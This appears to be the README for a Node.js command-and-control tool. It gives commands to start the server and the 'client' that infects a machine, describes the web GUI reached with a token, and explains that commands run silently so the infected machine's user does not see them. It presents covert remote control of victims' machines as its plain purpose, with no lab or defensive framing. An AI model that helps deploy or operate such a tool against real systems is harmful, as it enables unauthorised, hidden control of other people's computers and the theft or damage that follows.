To run the command and control server enter this command:

```
cd ./server/ && node script.js
```

Now, you can access the GUI by visiting 127.0.0.1:8000/?token=<b>TOKEN</b>

## Infect machines

---

To run the client enter this command:

```
cd ./client/ && node script.js
```

Now, you have successfully infected a machine! In the <b>/server/</b> folder you should see a weirdly named folder like this:

<b>5H6H6H6-0029-2456-1234-H3C93H2974K</b>

That is the UUID of the infected machine. Now you can execute commands on the infected machine using the GUI:

Enter any command you'd like and click <b>execute</b>!

<small>Note that the command is silent and the infected machine won't see it.</small>
